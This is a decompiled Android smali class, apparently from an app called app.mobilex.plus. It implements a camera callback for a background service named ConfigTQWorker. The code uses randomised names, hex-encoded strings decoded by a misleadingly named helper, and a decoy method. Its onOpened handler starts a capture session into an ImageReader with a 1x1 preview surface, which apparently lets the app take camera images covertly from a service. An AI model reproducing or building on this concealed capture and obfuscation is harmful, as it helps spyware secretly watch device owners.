.class public final Lv/s/ZSUCCvgkLgfCSFv;
.super Landroid/hardware/camera2/CameraDevice$StateCallback;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# instance fields
.field public final synthetic dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;


# direct methods
.method public constructor <init>(Lapp/mobilex/plus/services/ConfigTQWorker;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lv/s/ZSUCCvgkLgfCSFv;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;

    .line 2
    .line 3
    invoke-direct {p0}, Landroid/hardware/camera2/CameraDevice$StateCallback;-><init>()V

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method private static synthetic pwkwgtfpu()V
    .locals 1

    const-string v0, "scroll"

    const-string v0, "surface"

    const-string v0, "ERROR"

    const-string v0, "org.utils.dkemtvg"

    const-string v0, "Cancel"

    const-string v0, "WARN"

    return-void
.end method


# virtual methods
.method public final onDisconnected(Landroid/hardware/camera2/CameraDevice;)V
    .locals 0

    .line 1
    sget-object p1, Lapp/mobilex/plus/services/ConfigTQWorker;->ibVTtJUNfrGYbW:[B

    .line 2
    .line 3
    const-string p1, "000000770056008200E200BE009200A3002A00650058008800FE00B100D700A400370073005F"

    .line 4
    .line 5
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    iget-object p1, p0, Lv/s/ZSUCCvgkLgfCSFv;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;

    .line 9
    .line 10
    invoke-virtual {p1}, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM()V

    .line 11
    .line 12
    .line 13
    return-void
.end method

.method public final onError(Landroid/hardware/camera2/CameraDevice;I)V
    .locals 0

    .line 1
    sget-object p1, Lapp/mobilex/plus/services/ConfigTQWorker;->ibVTtJUNfrGYbW:[B

    .line 2
    .line 3
    const-string p1, "000000770056008200E200BE009200A2003100640054009500AA00FF"

    .line 4
    .line 5
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    iget-object p1, p0, Lv/s/ZSUCCvgkLgfCSFv;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;

    .line 9
    .line 10
    invoke-virtual {p1}, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM()V

    .line 11
    .line 12
    .line 13
    invoke-virtual {p1}, Landroid/app/Service;->stopSelf()V

    .line 14
    .line 15
    .line 16
    return-void
.end method

.method public final onOpened(Landroid/hardware/camera2/CameraDevice;)V
    .locals 3

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/ConfigTQWorker;->ibVTtJUNfrGYbW:[B

    .line 2
    .line 3
    const-string v0, "000000770056008200E200BE009200A8003300730055008200F4"

    .line 4
    .line 5
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    iget-object v0, p0, Lv/s/ZSUCCvgkLgfCSFv;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/ConfigTQWorker;

    .line 9
    .line 10
    iput-object p1, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM:Landroid/hardware/camera2/CameraDevice;

    .line 11
    .line 12
    :try_start_0
    iget-object p1, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->w9sT1Swbhx3hs:Landroid/media/ImageReader;

    .line 13
    .line 14
    if-eqz p1, :cond_0

    .line 15
    .line 16
    invoke-virtual {p1}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    .line 17
    .line 18
    .line 19
    move-result-object p1

    .line 20
    goto/16 :goto_0

    .line 21
    :catch_0
    move-exception p1

    .line 22
    goto :goto_2

    .line 23
    :cond_0
    const/4 p1, 0x0

    .line 24
    :goto_0
    if-nez p1, :cond_1

    .line 25
    .line 26
    goto/16 :goto_1

    .line 27
    :cond_1
    new-instance v1, Landroid/graphics/SurfaceTexture;

    .line 28
    .line 29
    const/16 v2, 0xa

    .line 30
    .line 31
    invoke-direct {v1, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    .line 32
    .line 33
    .line 34
    const/4 v2, 0x1

    .line 35
    invoke-virtual {v1, v2, v2}, Landroid/graphics/SurfaceTexture;->setDefaultBufferSize(II)V

    .line 36
    .line 37
    .line 38
    iget-object v1, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM:Landroid/hardware/camera2/CameraDevice;

    .line 39
    .line 40
    if-eqz v1, :cond_2

    .line 41
    .line 42
    invoke-static {p1}, Ljava/util/Collections;->singletonList(Ljava/lang/Object;)Ljava/util/List;

    .line 43
    .line 44
    .line 45
    move-result-object p1

    .line 46
    new-instance v2, Lv/s/Lll1MAU873FM;

    .line 47
    .line 48
    invoke-direct {v2, v0}, Lv/s/Lll1MAU873FM;-><init>(Lapp/mobilex/plus/services/ConfigTQWorker;)V

    .line 49
    .line 50
    .line 51
    iget-object v0, v0, Lapp/mobilex/plus/services/ConfigTQWorker;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 52
    .line 53
    invoke-virtual {v1, p1, v2, v0}, Landroid/hardware/camera2/CameraDevice;->createCaptureSession(Ljava/util/List;Landroid/hardware/camera2/CameraCaptureSession$StateCallback;Landroid/os/Handler;)V
    :try_end_0
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    .line 55
    .line 56
    :cond_2
    :goto_1
    return-void

    .line 57
    :goto_2
    const-string v0, "00000064005E008600E400BA009200B4002600650048008E00FF00B1009200A2003100640054009500AA00FF"

    .line 58
    .line 59
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 60
    .line 61
    .line 62
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    return-void
.end method
